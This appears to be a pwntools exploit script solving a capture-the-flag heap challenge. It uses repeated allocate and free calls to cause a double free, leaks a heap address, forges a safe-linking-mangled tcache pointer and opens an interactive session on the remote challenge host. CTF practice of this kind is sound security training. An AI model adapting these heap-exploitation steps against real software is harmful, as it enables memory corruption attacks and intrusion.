from pwn import *
from icecream import ic

elf = exe = ELF("./k511.elf")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("aie.challs.srdnlen.it", 1660)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''

c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def uu64(a): return u64(re(a).ljust(8, b"\x00"))
def gad(a, b): return ROP(a).find_gadget(b)[0]
def qgad(a, b): return ROP(a).find_gadget([f"pop " + b, "ret"])[0]
def binsh(a): return next(a.search(b"/bin/sh\x00"))
def i(): return io.interactive()

io = start()

def create(data):
    sl(b"1")
    sla(b"Input your memory (max 64 chars).\n", data)

def recollect(ind):
    sl(b"2")
    sla(b"Select the number you require.\n", str(ind))

def erase(ind):
    sl(b"3")
    sla(b"Select the number you require.\n", str(ind))

for i in range(13):
    create(b'a'*0x14)

for i in range(7, 0, -1):
    erase(i)

for i in range(8, 11):
    erase(i)

erase(9)

for i in range(7):
    create(b'a'*0x14)

recollect(8)
ru("\"")
heap = uu64(5) << 12 
ic(hex(heap))

payload = p64(((heap + 0x400) >> 12) ^ (heap + 0x2b0))

create(payload.ljust(0x14, b'\x00'))
create('abc')

for i in range(8, 0, -1):
    erase(i)

for i in range(1, 7):
    create('abc')

payload = p64(heap + 0x330)*2
create(payload)
recollect(2)
io.interactive()
